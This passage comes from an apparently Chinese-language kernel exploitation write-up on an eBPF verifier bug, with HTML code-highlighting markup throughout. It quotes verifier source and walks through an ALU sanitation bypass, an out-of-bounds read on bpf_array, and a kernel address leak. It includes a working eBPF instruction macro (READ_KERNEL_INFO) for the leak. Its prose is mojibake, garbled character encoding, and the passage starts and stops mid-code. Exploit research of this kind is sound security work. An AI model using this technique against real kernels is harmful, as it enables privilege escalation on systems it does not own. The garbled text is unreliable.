<span class="hljs-title">bpf_insn_aux_data</span> *<span class="hljs-title">aux_data</span> =</span> env-&gt;insn_aux_data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">trap</span> =</span> BPF_JMP_IMM(BPF_JA, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> *<span class="hljs-title">insn</span> =</span> env-&gt;prog-&gt;insnsi;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> insn_cnt = env-&gt;prog-&gt;len;<br><span class="hljs-type">int</span> i;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; insn_cnt; i++) &#123;<br><span class="hljs-keyword">if</span> (aux_data[i].seen)<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-built_in">memcpy</span>(insn + i, &amp;trap, <span class="hljs-keyword">sizeof</span>(trap));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h2 id="ä¸‰ã€å†…æ ¸åœ°å€æ³„éœ²"><a href="#ä¸‰ã€å†…æ ¸åœ°å€æ³„éœ²" class="headerlink" title="ä¸‰ã€å†…æ ¸åœ°å€æ³„éœ²"></a>ä¸‰ã€å†…æ ¸åœ°å€æ³„éœ²</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•æ³„éœ²å†…æ ¸åœ°å€ï¼Œæ¯”è¾ƒå®¹æ˜“æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬æˆ–è®¸å¯ä»¥é€šè¿‡è¿™ä¸ªè¿è¡Œæ—¶ä¸º 1 è€Œ verifier è®¤ä¸ºæ˜¯ 0 çš„å¯„å­˜å™¨æ„é€ ä¸€äº›è¶Šç•Œè¯»å–ï¼Œè€Œ map æ˜¯æˆ‘ä»¬èƒ½å¤Ÿç›´æ¥æ¥è§¦åˆ°çš„æŒ‡é’ˆä¹‹ä¸€ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°è¯•ä»æ­¤å¤„ä¸‹æ‰‹</p><p>æˆ‘ä»¬æ˜¯å¦å¯ä»¥ç›´æ¥å‘  <code>BPF_FUNC_map_lookup_elem()</code>  ä¼ å…¥ä¸€ä¸ª verifier ç¡®ä¿¡ä¸º 0 ä½†å®é™…ä¸Šæ˜¯è´Ÿæ•°çš„å¯„å­˜å™¨å‘¢ï¼Ÿ<strong>ç­”æ¡ˆæ˜¯å¦å®šçš„</strong>ï¼Œå› ä¸ºå¯¹äº <code>BPF_MAP_TYPE_ARRAY</code> ç±»å‹çš„ map è€Œè¨€åœ¨æŸ¥æ‰¾å…ƒç´ æ—¶å®é™…ä¸Šä¼šè°ƒç”¨åˆ° <code>array_map_lookup_elem()</code> ï¼Œå…¶ index ä¸ºæ— ç¬¦å·ç±»å‹ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•å‰å‘è¯»å–ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Called from syscall or from eBPF program */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">array_map_lookup_elem</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-type">void</span> *key)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> *<span class="hljs-title">array</span> =</span> container_of(<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> bpf_array, <span class="hljs-built_in">map</span>);<br>u32 index = *(u32 *)key;<br><br><span class="hljs-keyword">if</span> (unlikely(index &gt;= <span class="hljs-built_in">array</span>-&gt;<span class="hljs-built_in">map</span>.max_entries))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">array</span>-&gt;value + <span class="hljs-built_in">array</span>-&gt;elem_size * (index &amp; <span class="hljs-built_in">array</span>-&gt;index_mask);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†å½“æˆ‘ä»¬åœ¨ eBPF ç¨‹åºä¸­è°ƒç”¨ <code>BPF_FUNC_map_lookup_elem()</code>  æ—¶ï¼Œå…¶è¿”å›å€¼ä¸ºæŒ‡å‘ <code>value</code> çš„æŒ‡é’ˆï¼Œè€Œ<strong>è¿™ä¸ªæŒ‡é’ˆæ˜¯å…è®¸ä¸å¸¸é‡åšè¿ç®—çš„</strong>ï¼ˆç±»å‹ä¸º <code>PTR_TO_MAP_VALUE</code> ï¼‰ï¼Œç”±äºæˆ‘ä»¬æœ‰ä¸€ä¸ª verifier è®¤ä¸ºæ˜¯ 0 çš„å¯„å­˜å™¨ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾ç»•è¿‡å¯¹æŒ‡é’ˆèŒƒå›´çš„æ£€æŸ¥å¹¶å®Œæˆè¶Šç•Œè¯»å–â€¦â€¦å—ï¼Ÿ</p><h3 id="ALU-Sanitation-bypass"><a href="#ALU-Sanitation-bypass" class="headerlink" title="ALU Sanitation bypass"></a>ALU Sanitation bypass</h3><p><code>ALU Sanitation</code> æ˜¯ä¸€ä¸ªç”¨äº<strong>è¿è¡Œæ—¶åŠ¨æ€æ£€æµ‹</strong>çš„åŠŸèƒ½ï¼Œé€šè¿‡å¯¹ç¨‹åºæ­£åœ¨å¤„ç†çš„å®é™…å€¼è¿›è¡Œè¿è¡Œæ—¶æ£€æŸ¥ä»¥å¼¥è¡¥ verifier é™æ€åˆ†æçš„ä¸è¶³ï¼Œè¿™é¡¹æŠ€æœ¯é€šè¿‡è°ƒç”¨ <code>fixup_bpf_calls()</code> <strong>ä¸º eBPF ç¨‹åºä¸­çš„æ¯ä¸€æ¡æŒ‡ä»¤çš„å‰é¢éƒ½æ·»åŠ ä¸Šé¢å¤–çš„è¾…åŠ©æŒ‡ä»¤</strong>æ¥å®ç°</p><p>å¯¹äº <code>BPF_ADD</code> åŠ <code>BPF_SUB</code> è¿™æ ·çš„æŒ‡ä»¤è€Œè¨€ï¼Œä¼šæ·»åŠ å¦‚ä¸‹è¾…åŠ©æŒ‡ä»¤ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fixup_bpf_calls</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; insn_cnt; i++, insn++) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (insn-&gt;code == (BPF_ALU64 | BPF_ADD | BPF_X) ||<br>    insn-&gt;code == (BPF_ALU64 | BPF_SUB | BPF_X)) &#123;<br><span class="hljs-type">const</span> u8 code_add = BPF_ALU64 | BPF_ADD | BPF_X;<br><span class="hljs-type">const</span> u8 code_sub = BPF_ALU64 | BPF_SUB | BPF_X;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">insn_buf</span>[16];</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> *<span class="hljs-title">patch</span> =</span> &amp;insn_buf[<span class="hljs-number">0</span>];<br><span class="hljs-type">bool</span> issrc, isneg;<br>u32 off_reg;<br><br>aux = &amp;env-&gt;insn_aux_data[i + delta];<br><span class="hljs-keyword">if</span> (!aux-&gt;alu_state ||<br>    aux-&gt;alu_state == BPF_ALU_NON_POINTER)<br><span class="hljs-keyword">continue</span>;<br><br>isneg = aux-&gt;alu_state &amp; BPF_ALU_NEG_VALUE;<br>issrc = (aux-&gt;alu_state &amp; BPF_ALU_SANITIZE) ==<br>BPF_ALU_SANITIZE_SRC;<br><br>off_reg = issrc ? insn-&gt;src_reg : insn-&gt;dst_reg;<br><span class="hljs-keyword">if</span> (isneg)<br>*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, <span class="hljs-number">-1</span>);<br>*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit - <span class="hljs-number">1</span>);<br>*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);<br>*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);<br>*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, <span class="hljs-number">0</span>);<br>*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, <span class="hljs-number">63</span>);<br><span class="hljs-keyword">if</span> (issrc) &#123;<br>*patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX,<br> off_reg);<br>insn-&gt;src_reg = BPF_REG_AX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>*patch++ = BPF_ALU64_REG(BPF_AND, off_reg,<br> BPF_REG_AX);<br>&#125;<br><span class="hljs-keyword">if</span> (isneg)<br>insn-&gt;code = insn-&gt;code == code_add ?<br>     code_sub : code_add;<br>*patch++ = *insn;<br><span class="hljs-keyword">if</span> (issrc &amp;&amp; isneg)<br>*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, <span class="hljs-number">-1</span>);<br>cnt = patch - insn_buf;<br><br>new_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);<br><span class="hljs-keyword">if</span> (!new_prog)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>delta    += cnt - <span class="hljs-number">1</span>;<br>env-&gt;prog = prog = new_prog;<br>insn      = new_prog-&gt;insnsi + i + delta;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>aux-&gt;alu_limit</code> ä¸º<strong>å½“å‰æŒ‡é’ˆè¿ç®—èŒƒå›´</strong>ï¼Œåˆå§‹æ—¶ä¸º 0ï¼Œä¸æŒ‡é’ˆæ‰€åšçš„å¸¸é‡è¿ç®—åŒæ­¥ï¼Œå¯¹äºå‡æ³•è€Œè¨€å¯è¯»èŒƒå›´ä¸º <code>(ptr - alu_limit, ptr]</code> ï¼ˆä»¥æŒ‡é’ˆæœ€åˆæŒ‡å‘çš„åœ°å€ä¸º <code>0</code>ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦ç»•è¿‡è¿™ä¸ªæ£€æŸ¥</p><p>ç”±äºæˆ‘ä»¬æœ‰è¿è¡Œæ—¶ä¸º 1ã€verifier è®¤ä¸ºæ˜¯ 0 çš„å¯„å­˜å™¨ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·è°ƒæ•´èŒƒå›´ï¼š</p><ul><li>æ„é€ å¦å¤–ä¸€ä¸ªåŒæ ·æ˜¯è¿è¡Œæ—¶å€¼ä¸º 1ã€verifier è®¤ä¸ºæ˜¯ 0 çš„å¯„å­˜å™¨ <code>R8</code></li><li>å°† <code>R8</code> ä¹˜ä¸Šä¸€ä¸ªä¸å¤§äº value size çš„å€¼ï¼ˆä¾‹å¦‚ value size ä¸º <code>0x1000</code>ï¼Œ<code>R8</code> ä¾¿è®¾ä¸º <code>0x1000</code>ï¼‰</li><li>å°†æŒ‡å‘ map ç¬¬ä¸€ä¸ªå…ƒç´ ç¬¬ä¸€ä¸ªå­—èŠ‚ <code>value[0]</code> çš„å¯„å­˜å™¨ï¼ˆå‡è®¾ä¸º <code>R7</code> ï¼‰å…ˆåŠ ä¸Š <code>0x1000</code>ï¼Œæ­¤æ—¶ <code>alu_limit</code> å˜ä¸º <code>0x1000</code>ï¼Œ<code>R7</code> æŒ‡å‘ <code>value[0x1000]</code></li><li><code>R7 -= R8</code>ï¼Œç”±äº verifier è®¤ä¸º R8 ä¸º 0ï¼Œå› æ­¤ <code>alu_limit</code> ä¿æŒä¸å˜ï¼Œ<strong>ä½† R7 å®é™…ä¸Šå·²ç»æŒ‡å›äº†</strong> <code>value[0]</code></li></ul><p>ç”±æ­¤æˆ‘ä»¬ä¾¿èƒ½ç»§ç»­æ„‰å¿«åœ°è¿›è¡Œå‰å‘çš„è¶Šç•Œè¯»äº†</p><blockquote><p>æ³¨ï¼šåœ¨å†…æ ¸ç‰ˆæœ¬ 5.11.8 ä¹‹å‰ ALU Sanitation å­˜åœ¨ä¸€ä¸ªæ¼æ´ï¼Œå³ <code>aux_alu_limit</code> è¢«åˆå§‹åŒ–ä¸º 0 ä»è€Œå¯¼è‡´ <code>0-1</code> é€ æˆæ•´å‹æº¢å‡ºå˜ä¸ºä¸€ä¸ªå·¨å¤§çš„å€¼ï¼Œåœ¨<a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/patch/?id=10d2bb2e6b1d8c4576c56a748f697dbeb8388899">è¿™ä¸ª commit</a> ä¸­æ‰è¢«ä¿®å¤ï¼Œå› æ­¤å¯¹äº 5.11.8 ä¹‹å‰ç‰ˆæœ¬çš„å†…æ ¸è€Œè¨€æ˜¯ä¸éœ€è¦ç»•è¿‡è¯¥æ£€æŸ¥çš„</p></blockquote><h3 id="OOB-read-on-bpf-array"><a href="#OOB-read-on-bpf-array" class="headerlink" title="OOB-read on bpf_array"></a>OOB-read on bpf_array</h3><p>ç°åœ¨è®©æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªå­˜æ”¾æ•°æ®çš„ä½ç½®é™„è¿‘æœ‰æ²¡æœ‰ä»€ä¹ˆæœ‰è¶£çš„æ•°æ®ï¼Œå¯¹äº <code>BPF_MAP_TYPE_ARRAY</code> ç±»å‹ çš„ map è€Œè¨€ï¼Œå…¶ wrapper ä¸º <code>bpf_array</code> ç±»å‹ï¼ˆå³ <code>bpf_map</code> å†…åµŒäºè¯¥ç»“æ„ä½“ä¸­ï¼‰ï¼Œ<strong>æ•°æ®åˆ™ç›´æ¥å­˜æ”¾åœ¨å…¶å†…éƒ¨çš„</strong> <code>value</code> <strong>æ•°ç»„æˆå‘˜å½“ä¸­</strong>ï¼Œå› æ­¤åœ¨æŸ¥æ‰¾å…ƒç´ æ—¶æˆ‘ä»¬è·å¾—çš„å…¶å®æ˜¯ä¸€ä¸ªæŒ‡å‘ <code>bpf_array</code> å†…éƒ¨çš„æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> <span class="hljs-title">map</span>;</span><br>u32 elem_size;<br>u32 index_mask;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array_aux</span> *<span class="hljs-title">aux</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>DECLARE_FLEX_ARRAY(<span class="hljs-type">char</span>, value) __aligned(<span class="hljs-number">8</span>);<br>DECLARE_FLEX_ARRAY(<span class="hljs-type">void</span> *, ptrs) __aligned(<span class="hljs-number">8</span>);<br>DECLARE_FLEX_ARRAY(<span class="hljs-type">void</span> __percpu *, pptrs) __aligned(<span class="hljs-number">8</span>);<br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬åªéœ€è¦å‰å‘è¯»å–ä¾¿èƒ½è¯»å–åˆ° <code>bpf_map</code>ï¼Œä¹‹åé€šè¿‡ <code>bpf_map</code> çš„å‡½æ•°è¡¨ï¼ˆ<code>bpf_map-&gt;ops</code> ï¼‰ä¾¿èƒ½æ³„éœ²å‡ºå†…æ ¸åœ°å€ï¼Œè¿™é‡Œæˆ‘ä»¬å°† <code>bpf_array_ops</code> çš„å€¼è¯»å–åˆ° <code>map[1]</code> ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_KERNEL_INFO(__map_fd)                      \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x110),        \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* save the value into map */</span>                   \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸæ³„éœ²å‡ºå†…æ ¸åœ°å€ï¼š</p><p><img src="https://s2.loli.net/2023/06/04/zE4t6RO8acsMbJV.png" alt="image.png"></p><blockquote><p>ç¬”è€…æœ¬æ¥æƒ³ç›´æ¥å†™ä¸€ä¸ªå¾ªç¯ç›´æ¥å¾€å‰ç›²è¯» <code>page_offset_base + 0x9d000</code> ï¼ˆé€šè¿‡ç‰©ç†åœ°å€ 0 å¤„æ•°æ®å®šä½ï¼‰ï¼Œä½†æ˜¯  <em>verifier è¦æ±‚ä¸èƒ½æœ‰å›å‘è¾¹</em>  ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æ˜¯è€è€å®å®åœ°çœ‹ <code>bpf_array</code> å‘¨å›´çš„æ•°æ®ï¼šï¼‰</p></blockquote><h3 id="Leak-map-address"><a href="#Leak-map-address" class="headerlink" title="Leak map address"></a>Leak map address</h3><p>å½“æˆ‘ä»¬åœ¨è°ƒç”¨è¾…åŠ©å‡½æ•° <code>BPF_FUNC_map_lookup_elem()</code> æ—¶ï¼Œè¯¥å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªæŒ‡å‘ <code>value</code> çš„æŒ‡é’ˆï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½å¤Ÿç›´æ¥å°†è¿™ä¸ªå€¼å­˜æ”¾åˆ° map å½“ä¸­ä»è€Œæ³„éœ²å‡º map åœ°å€ï¼Ÿé€šå¸¸æƒ…å†µä¸‹ç­”æ¡ˆæ˜¯å¦å®šçš„ï¼Œverifier ä¼šæ£€æŸ¥å¯„å­˜å™¨çš„ç±»å‹å¹¶é˜»æ­¢æŒ‡é’ˆæ³„éœ²çš„æƒ…å†µå‘ç”Ÿ</p><p>ç°åœ¨è®©æˆ‘ä»¬æ€è€ƒå¦‚ä½•åˆ©ç”¨æˆ‘ä»¬çš„æ¼æ´å¯„å­˜å™¨ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œæ³¨æ„åˆ° verifier åœ¨è·Ÿè¸ªæŒ‡é’ˆå¯„å­˜å™¨ä¸å¸¸é‡å¯„å­˜å™¨é—´è¿ç®—æ—¶ä¼šè°ƒç”¨åˆ° <code>adjust_ptr_min_max_vals()</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">adjust_reg_min_max_vals</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> bpf_insn *insn)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_verifier_state</span> *<span class="hljs-title">vstate</span> =</span> env-&gt;cur_state;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_func_state</span> *<span class="hljs-title">state</span> =</span> vstate-&gt;frame[vstate-&gt;curframe];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">regs</span> =</span> state-&gt;regs, *dst_reg, *src_reg;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">ptr_reg</span> =</span> <span class="hljs-literal">NULL</span>, off_reg = &#123;<span class="hljs-number">0</span>&#125;;<br>u8 opcode = BPF_OP(insn-&gt;code);<br><span class="hljs-type">int</span> err;<br><br>dst_reg = &amp;regs[insn-&gt;dst_reg];<br>src_reg = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span> (dst_reg-&gt;type != SCALAR_VALUE)<br>ptr_reg = dst_reg;<br><span class="hljs-keyword">else</span><br><span class="hljs-comment">/* Make sure ID is cleared otherwise dst_reg min/max could be</span><br><span class="hljs-comment"> * incorrectly propagated into other registers by find_equal_scalars()</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;id = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;<br>src_reg = &amp;regs[insn-&gt;src_reg];<br><span class="hljs-keyword">if</span> (src_reg-&gt;type != SCALAR_VALUE) &#123;<br><span class="hljs-comment">//...</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ptr_reg) &#123;<br><span class="hljs-comment">/* pointer += scalar */</span><br>err = mark_chain_precision(env, insn-&gt;src_reg);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br><span class="hljs-keyword">return</span> adjust_ptr_min_max_vals(env, insn,<br>       dst_reg, src_reg);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œåœ¨ <code>adjust_ptr_min_max_vals()</code> å½“ä¸­æœ‰è¿™æ ·ä¸€ä¸ªé€»è¾‘ï¼šå¦‚æœæºå¯„å­˜å™¨çš„è¾¹ç•Œå­˜åœ¨ <code>smin_val &gt; smax_val || umin_val &gt; umax_val</code> çš„æƒ…å†µï¼Œ<strong>åˆ™ç›´æ¥å°†ç›®çš„å¯„å­˜å™¨è®¾ä¸º unknown</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">adjust_ptr_min_max_vals</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> bpf_insn *insn,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_reg_state *ptr_reg,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_reg_state *off_reg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_verifier_state</span> *<span class="hljs-title">vstate</span> =</span> env-&gt;cur_state;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_func_state</span> *<span class="hljs-title">state</span> =</span> vstate-&gt;frame[vstate-&gt;curframe];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">regs</span> =</span> state-&gt;regs, *dst_reg;<br><span class="hljs-type">bool</span> known = tnum_is_const(off_reg-&gt;var_off);<br>s64 smin_val = off_reg-&gt;smin_value, smax_val = off_reg-&gt;smax_value,<br>    smin_ptr = ptr_reg-&gt;smin_value, smax_ptr = ptr_reg-&gt;smax_value;<br>u64 umin_val = off_reg-&gt;umin_value, umax_val = off_reg-&gt;umax_value,<br>    umin_ptr = ptr_reg-&gt;umin_value, umax_ptr = ptr_reg-&gt;umax_value;<br>u32 dst = insn-&gt;dst_reg, src = insn-&gt;src_reg;<br>u8 opcode = BPF_OP(insn-&gt;code);<br><span class="hljs-type">int</span> ret;<br><br>dst_reg = &amp;regs[dst];<br><br><span class="hljs-keyword">if</span> ((known &amp;&amp; (smin_val != smax_val || umin_val != umax_val)) ||<br>    smin_val &gt; smax_val || umin_val &gt; umax_val) &#123;<br><span class="hljs-comment">/* Taint dst register if offset had invalid bounds derived from</span><br><span class="hljs-comment"> * e.g. dead branches.</span><br><span class="hljs-comment"> */</span><br>__mark_reg_unknown(env, dst_reg);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>è€Œ <code>__mark_reg_unknown()</code> åˆ™ä¼š<strong>ç›´æ¥å°†å¯„å­˜å™¨è®¾ä¸ºæ ‡é‡å€¼ç±»å‹ï¼Œè¿™æ ·çš„å€¼å¯ä»¥ç›´æ¥å­˜å…¥ map è€Œä¸ä¼šè¢« verifier é™åˆ¶</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> __mark_reg_unknown(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_verifier_env *env,<br>       <span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Clear type, id, off, and union(map_ptr, range) and</span><br><span class="hljs-comment"> * padding between &#x27;type&#x27; and union</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">memset</span>(reg, <span class="hljs-number">0</span>, offsetof(<span class="hljs-keyword">struct</span> bpf_reg_state, var_off));<br>reg-&gt;type = SCALAR_VALUE;<br>reg-&gt;var_off = 